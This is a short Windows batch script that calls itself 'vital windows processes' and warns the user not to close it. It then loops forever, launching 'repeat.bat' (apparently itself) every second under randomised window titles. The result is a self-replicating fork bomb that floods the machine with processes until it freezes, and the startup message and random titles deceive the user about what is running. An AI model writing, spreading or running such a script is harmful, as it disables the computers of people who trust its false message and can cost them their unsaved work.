@echo off 
color 0a
echo Starting vital windows processes, do not close
Pushd "%~dp0"
:a
title win%random%a
timeout /t 1 /nobreak >nul
start repeat.bat
goto a